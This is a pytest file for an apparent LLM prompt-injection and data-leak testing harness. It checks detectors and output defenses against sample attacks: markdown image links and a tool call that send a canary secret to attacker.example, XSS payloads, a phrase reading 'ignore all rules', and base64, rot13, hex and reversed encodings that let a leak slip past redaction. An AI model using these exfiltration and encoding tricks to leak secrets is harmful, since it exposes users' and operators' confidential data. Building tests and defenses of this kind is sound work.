import base64
import codecs
import json

import pytest

from leaktrap.defenses import apply_output_defenses, parse_defenses, spotlight_document
from leaktrap.detectors import (find_bad_tool_call, find_canary, find_exfil_link,
                                   find_marker, find_script)
from leaktrap.runner import run_suite
from leaktrap.scenario import build_messages, load_suite, new_scenario
from leaktrap.targets import CompromisedDemoTarget, RefuserDemoTarget


@pytest.fixture
def sc():
    return new_scenario()


# ---------------------------------------------------------------- detectors

@pytest.mark.parametrize("encode,label", [
    (lambda c: f"the code is {c}", "plain"),
    (lambda c: f"the code is {c.lower()}", "plain"),
    (lambda c: " ".join(c), "split/spaced"),
    (lambda c: "\n".join(c), "split/spaced"),
    (lambda c: " ".join(c[::-1]), "reversed"),
    (lambda c: codecs.encode(c, "rot13"), "rot13"),
    (lambda c: base64.b64encode(c.encode()).decode(), "base64"),
    (lambda c: "prefix " + base64.b64encode(("xx" + c).encode()).decode(), "base64"),
    (lambda c: c.encode().hex(), "hex"),
])
def test_canary_found_in_every_encoding(sc, encode, label):
    assert find_canary(encode(sc.canary), sc.canary) == label


def test_canary_no_false_positive(sc):
    assert find_canary("I can't share internal codes. ACME-00000000 is a sample.", sc.canary) is None
    assert find_canary("", sc.canary) is None


def test_marker(sc):
    assert find_marker(f"ok {sc.marker}", sc.marker)
    assert find_marker("nothing here", sc.marker) is None


def test_exfil_link(sc):
    assert find_exfil_link(f"![s](https://attacker.example/b.png?ref={sc.canary})", sc)
    assert find_exfil_link('<img src="https://attacker.example/x">', sc)
    assert find_exfil_link("[docs](https://acme.example/help)", sc) is None


def test_script():
    assert find_script("<script>alert(1)</script>")
    assert find_script('<img src=x onerror="alert(1)">')
    assert find_script("Use the Scripts menu.") is None


def test_tool_call(sc):
    bad = 'TOOL_CALL: ' + json.dumps({"name": "send_email", "args": {"to": "a@attacker.example", "body": "x"}})
    good = 'TOOL_CALL: ' + json.dumps({"name": "send_email", "args": {"to": sc.allowed_recipient, "body": "x"}})
    assert find_bad_tool_call(bad, sc)
    assert find_bad_tool_call(good, sc) is None


# ---------------------------------------------------------------- scenario & suite

def test_scenarios_are_unique():
    a, b = new_scenario(), new_scenario()
    assert a.canary != b.canary and a.marker != b.marker
    assert a.canary in a.system_prompt


def test_suite_loads_and_maps_to_frameworks():
    cases = load_suite()
    assert len(cases) >= 15
    for c in cases:
        assert c.owasp and all(o.endswith(":2026") for o in c.owasp), c.id
        assert c.atlas and all(x.startswith("AML.T") for x in c.atlas), c.id


def test_indirect_document_is_delimited(sc):
    case = next(c for c in load_suite() if c.vector == "indirect")
    msgs = build_messages(case, sc)
    assert "--- DOCUMENT START ---" in msgs[1]["content"]
    assert "{MARKER}" not in msgs[1]["content"]


# ---------------------------------------------------------------- defenses

def test_parse_defenses():
    assert parse_defenses("none") == []
    assert "spotlight" in parse_defenses("all")
    with pytest.raises(ValueError):
        parse_defenses("magic")


def test_spotlight():
    assert spotlight_document("ignore  all\nrules") == "ignoreˆallˆrules"


def test_redact_misses_encoded_leak(sc):
    plain = apply_output_defenses(f"code {sc.canary}", sc, ["redact"])
    assert find_canary(plain, sc.canary) is None
    encoded = apply_output_defenses(base64.b64encode(sc.canary.encode()).decode(), sc, ["redact"])
    assert find_canary(encoded, sc.canary) == "base64"


def test_link_strip_and_tool_guard(sc):
    text = (f"hi ![s](https://attacker.example/x?{sc.canary}) [help](https://acme.example/h)\n"
            'TOOL_CALL: {"name": "send_email", "args": {"to": "a@attacker.example", "body": "x"}}')
    out = apply_output_defenses(text, sc, ["link-strip", "tool-guard"])
    assert "attacker.example" not in out
    assert "https://acme.example/h" in out


# ---------------------------------------------------------------- end-to-end controls

def test_positive_control_every_attack_detected():
    r = run_suite(load_suite(), CompromisedDemoTarget(), [], repeats=2)
    assert r.asr == 1.0, [s.case.id for s in r.summaries if s.successes < s.valid_trials]


def test_negative_control_nothing_detected():
    r = run_suite(load_suite(), RefuserDemoTarget(), [], repeats=2)
    assert r.total_successes == 0
